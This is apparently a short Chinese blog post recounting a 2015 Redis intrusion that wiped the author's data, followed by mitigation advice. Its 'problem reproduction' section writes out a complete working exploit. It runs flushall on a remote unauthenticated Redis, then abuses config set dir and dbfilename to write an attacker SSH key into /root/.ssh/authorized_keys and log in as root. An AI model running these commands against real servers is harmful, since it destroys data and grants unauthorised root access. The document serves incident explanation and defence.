**redis-exec 漏洞 **

**缘来**

某日发现阿里云上面的机器上面redis库相关数据获取不到，登陆后
发现之前所有key已经清除干净。查询所有redis相关文档，问题还是
找不到原因。最后在查看系统 所有keys时发现了crackit。这才恍然
意识到可能被黑了。。

查询相关新闻发现2015年11月10日中午12点左右，发现不知名团体利用redis世界缺陷针对全球互联网的全网性入侵事件，结果将导致：redis数据丢失，服务器的ssh公钥被替换.


**问题重现**

```bash

## 生成ssh  key
ssh-keygen -t rsa -C "root@redis.io"


## 生成 pub key 文件
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt


## 刷新远程 ip  redis
redis-cli -h ip  flushall

## 设置远程 redis key crackit  
cat foo.txt | redis-cli -h ip  -x set crackit



### 远程登陆，设置 /root/.ssh/authorized_keys
$ redis-cli -h ip
ip:6379> config set dir /root/.ssh/
OK
ip:6379> config get dir
1) "dir"
2) "/root/.ssh"
ip:6379> config set dbfilename "authorized_keys"
OK
ip:6379> save
OK

### 远程登陆
ssh -i id_rsa root@ip

```

*************

**注意**

>> 上面redis 必须是root用户，才可成功，如果不是那么尝试
用户，这个就稍麻烦些


**防范**

>>  修改 redis 配置文件 bind 127.0.0.1，这样只能本地访问

>> 修改 redis 默认访问端口 6379, 很多端口扫描就是针对的
这些常用的端口。

>> 修改 requirepass ，增加密码访问

>> 修改redis 运行权限 。


*******

**参考**


[redis-exec](https://packetstormsecurity.com/files/134200/redis-exec.txt)
